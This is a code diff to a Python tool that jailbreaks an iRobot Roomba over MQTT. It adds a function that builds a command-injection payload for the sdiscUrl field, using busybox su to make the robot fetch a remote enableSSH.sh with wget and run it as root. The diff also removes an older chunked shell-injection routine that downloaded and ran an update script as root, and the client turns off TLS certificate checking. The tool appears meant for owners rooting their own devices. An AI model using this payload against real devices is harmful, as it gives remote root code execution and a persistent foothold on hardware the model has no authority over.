@@ -6,6 +6,10 @@ import ssl
 import json
 import argparse
 import socket
+import time
+
+# connectivity_manager rejects any sdiscUrl longer than this (cmp r0,0xbf at 0x101d0).
+SDISCURL_MAX_BYTES = 191
 
 def get_local_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -20,45 +24,65 @@ def get_local_ip():
 
 httpd : HTTPServer|None = None
 
-parser = argparse.ArgumentParser("runjailed")
-parser.add_argument("--ip", "-i", dest="ip", help="Your robot's IP", required=True, type=str)
-parser.add_argument("--blid", "-b", dest="blid", help="Your robot's BLID", required=True, type=str)
-parser.add_argument("--password", "-p", dest="password", help="Your robot's password", required=True, type=str)
-parser.add_argument("--callback", "-c", dest="cb", help="Your computer's LAN IP", required=False, type=str)
-
-args = parser.parse_args()
-
-LOCAL_IP = args.cb or get_local_ip()
+LOCAL_IP = None
+mqttc = None
+PENDING_URLS: list[str] = []
+SEND_DELAY = 1.5
 DELTA = "delta"
 RUNJAILED_HOME = "/data/opt/irobot/persistent/opt/runjailed"
 AVAILABLE_CMD_SPACE = 1
 
 def sendCmd(cmd: str):
-    if len(cmd) > 20:
-        return False
-    # TODO: Implement
-    pass
+    """Publish the raw string as state.sdiscUrl on topic wifictl.
 
-def sendChunkedCommand(cmd: str, file: str|None = "I", display=str|None):
-    if len(file) > 1: return False
-    sendCmd('rm /tmp/' + file)
-    
-    chunks = [cmd[i:i+AVAILABLE_CMD_SPACE] for i in range(0, len(cmd), AVAILABLE_CMD_SPACE)]
+    True only means Paho accepted the publish locally. It does not confirm
+    broker delivery, robot processing, or shell execution.
+    """
+    if not isinstance(cmd, str) or len(cmd.encode()) > 191:
+        raise ValueError("cmd must be a string of at most 191 bytes")
+    if mqttc is None:
+        raise RuntimeError("MQTT client is not initialized")
+    result = mqttc.publish("wifictl", json.dumps({"state": {"sdiscUrl": cmd}}), qos=1)
+    return result.rc == mqtt.MQTT_ERR_SUCCESS
 
-    for cmd in chunks:
-        cmd = cmd.replace('"', '\\"')
-        sendCmd('printf "' + cmd + '">>/tmp/' + file)
+def sendChunkedCommand(cmd: str, file: str|None = "I", display: str|None = None):
+    raise NotImplementedError("Shell commands are unsupported: sendCmd only configures a discovery URL")
 
-    sendCmd("chmod a+x /tmp/"+ file)
-    sendCmd("bash -c /tmp/" + file)
-    print(f"$$$: {display or cmd}")
 
 def runAsRoot(cmd: str, file:str="I"):
-    sendChunkedCommand('/bin/busybox su -c \''+cmd+'\'', file, display=cmd)
+    raise NotImplementedError("Root commands are unsupported: sendCmd only configures a discovery URL")
+
+
+def enableSshUrl(host: str, port: int = 8899, busybox: str = "/bin/busybox") -> str:
+    """Build the sdiscUrl payload that makes connectivity_manager fetch and run
+    enableSSH.sh as root (busybox is setuid and allowed for the apps user).
+
+    The whole payload must stay within SDISCURL_MAX_BYTES.
+    """
+    remote = f"wget -qO/tmp/e http://{host}:{port}/enableSSH.sh;sh /tmp/e {host} {port}"
+    url = f"https://$({busybox} su -c '{remote}')"
+    if len(url.encode()) > SDISCURL_MAX_BYTES:
+        raise ValueError(f"payload is {len(url.encode())} bytes, max {SDISCURL_MAX_BYTES}")
+    return url
+
 
 def on_connect(client, userdata, flags, reason_code, properties):
     print("Connected successfully!")
     client.subscribe("$SYS/#")
+    if PENDING_URLS:
+        urls, PENDING_URLS[:] = list(PENDING_URLS), []
+        threading.Thread(target=_send_all, args=(client, urls, SEND_DELAY), daemon=True).start()
+
+
+def _send_all(client, urls, delay):
+    for url in urls:
+        try:
+            ok = sendCmd(url)
+            print(f"sendCmd rc={ok} bytes={len(url.encode())}: {url}")
+        except (ValueError, RuntimeError) as exc:
+            print(f"sendCmd failed for {url!r}: {exc}")
+        time.sleep(delay)
+    client.disconnect()
 
 def on_message(client, userdata, msg):
     pl = json.loads(msg.payload)
@@ -66,10 +90,7 @@ def on_message(client, userdata, msg):
         robotDat = pl['state']['reported']
         print("Discovered: " + robotDat['sku'] +" on " + robotDat['softwareVer'])
         
-        runAsRoot(f"mkdir -p {RUNJAILED_HOME}/scripts && wget https://raw.githubusercontent.com/ia74/roomba_rest980/refs/heads/main/runjailed/scripts/update.sh -O {RUNJAILED_HOME}/scripts/update.sh && chmod a+x {RUNJAILED_HOME}/scripts/update.sh && bash -c \"{RUNJAILED_HOME}/scripts/update.sh {LOCAL_IP}\"", "A")
-        
-        print("\nWorking... Don't close this! Commands are being sent over and executed.")
-        print("This is a demonstration, soon this will become functional.")
+        print("Automatic jailbreak workflow is disabled: sendCmd only configures a discovery URL.")
 
 class RunjailedHTTPHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args): pass
@@ -96,20 +117,49 @@ class RunjailedHTTPHandler(BaseHTTPRequestHandler):
           ver = self.path.split("version/")[1]
           print(f"[SUCCESS] Downloaded roomba::unjailed v{ver} to Roomba.")
 
-server_address = ('', 8883)
-httpd = HTTPServer(server_address, RunjailedHTTPHandler)
-      
-t = threading.Thread(target=httpd.serve_forever, daemon=True)
-t.start()
+def main():
+    global LOCAL_IP, httpd, mqttc, SEND_DELAY
+    parser = argparse.ArgumentParser("runjailed")
+    parser.add_argument("--ip", "-i", dest="ip", help="Your robot's IP", required=True, type=str)
+    parser.add_argument("--blid", "-b", dest="blid", help="Your robot's BLID", required=True, type=str)
+    parser.add_argument("--password", "-p", dest="password", help="Your robot's password", required=True, type=str)
+    parser.add_argument("--callback", "-c", dest="cb", help="Your computer's LAN IP", required=False, type=str)
+    parser.add_argument("--send", dest="send", action="append", default=[], metavar="URL",
+                        help="publish this state.sdiscUrl value after connecting (repeatable)")
+    parser.add_argument("--enable-ssh", dest="enable_ssh", metavar="HOST[:PORT]",
+                        help="publish the payload that runs enableSSH.sh on the robot as root")
+    parser.add_argument("--send-delay", dest="send_delay", type=float, default=1.5,
+                        help="seconds between publishes (default 1.5)")
 
-mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
-mqttc.on_connect = on_connect
-mqttc.on_message = on_message
+    args = parser.parse_args()
 
-mqttc.tls_set(cert_reqs=ssl.CERT_NONE)
-mqttc.tls_insecure_set(True) # The certificate is now expired. Expired on Dec 31 2025.
+    urls = list(args.send)
+    if args.enable_ssh:
+        host, _, port = args.enable_ssh.partition(":")
+        urls.append(enableSshUrl(host, int(port or 8899)))
 
-mqttc.username_pw_set(args.blid,args.password)
-mqttc.connect(args.ip, 8883, 60)
+    LOCAL_IP = args.cb or get_local_ip()
 
-mqttc.loop_forever()
+    server_address = ('', 8883)
+    httpd = HTTPServer(server_address, RunjailedHTTPHandler)
+
+    t = threading.Thread(target=httpd.serve_forever, daemon=True)
+    t.start()
+
+    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
+    mqttc.on_connect = on_connect
+    mqttc.on_message = on_message
+    PENDING_URLS[:] = urls
+    SEND_DELAY = args.send_delay
+
+    mqttc.tls_set(cert_reqs=ssl.CERT_NONE)
+    mqttc.tls_insecure_set(True) # The certificate is now expired. Expired on Dec 31 2025.
+
+    mqttc.username_pw_set(args.blid,args.password)
+    mqttc.connect(args.ip, 8883, 60)
+
+    mqttc.loop_forever()
+
+
+if __name__ == "__main__":
+    main()
